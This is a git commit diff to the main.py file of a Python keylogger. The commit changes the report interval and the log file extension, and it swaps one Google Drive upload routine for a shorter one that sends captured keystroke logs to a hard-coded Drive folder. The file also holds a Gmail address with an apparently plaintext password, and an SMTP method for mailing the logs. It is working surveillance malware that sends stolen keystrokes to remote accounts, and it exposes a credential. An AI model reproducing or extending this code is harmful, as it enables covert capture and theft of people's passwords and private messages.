eecc7873156ab1c8231f4d1474bb2b656dad6a58
Farha Alfarsy <fa.alfarsy@gmail.com>
2021-08-21 18:44:19 +0100

    User tested code with Google API

--- main.py
+++ main.py
@@ -7,7 +7,7 @@ from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
 
 # initializing parameters
-SEND_REPORT_EVERY = 10  # seconds
+SEND_REPORT_EVERY = 17  # seconds
 EMAIL_ADDRESS = "pythonkeylogger21@gmail.com"
 EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"
 
@@ -51,27 +51,15 @@ class KeyLogger:
         Create log file in the current directory that contains current logs
         in 'self.log'
         """
-        with open(f"{self.filename}.pdf", "w") as f:
+        with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
 
-        g_auth = GoogleAuth()
-        g_auth.LocalWebserverAuth()  # starts browser and asks for authentication
-        drive = GoogleDrive(g_auth)  # create a google drive object to handle file, used to list and create file
-
-        # view files/folders in drive
-        file_list = drive.ListFile({'q': "'root' in parents and trashed=false"}).GetList()
-        for file in file_list:
-            print('Title: %s, ID: %s' % (file['title'], file[id]))
-            # get folder ID to upload to
-            if file['title'] == "Key Logs":
-                fileID = file['id']
-
-        file1 = drive.CreateFile({"mimeType": "text/csv", "parents": [
-            {"kind": "drive#fileLink", "id": fileID}]})  # initialize a google drive file
-        file1.SetContentFile(f"{self.filename}.csv")
-        file1.Upload()
-        print('Created file %s with mimeType %s' % (file1['title'], file1['mimeType']))
+        gauth = GoogleAuth()
+        drive = GoogleDrive(gauth)
+        gfile = drive.CreateFile({'parents': [{'id': '1p6xk078N1uzEbLmtq_lhUUKxj1KUI97z'}]})
+        gfile.SetContentFile(f"{self.filename}.txt")
+        gfile.Upload()
 
     def sendmail(self, email, password, message):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages connection to SMTP server
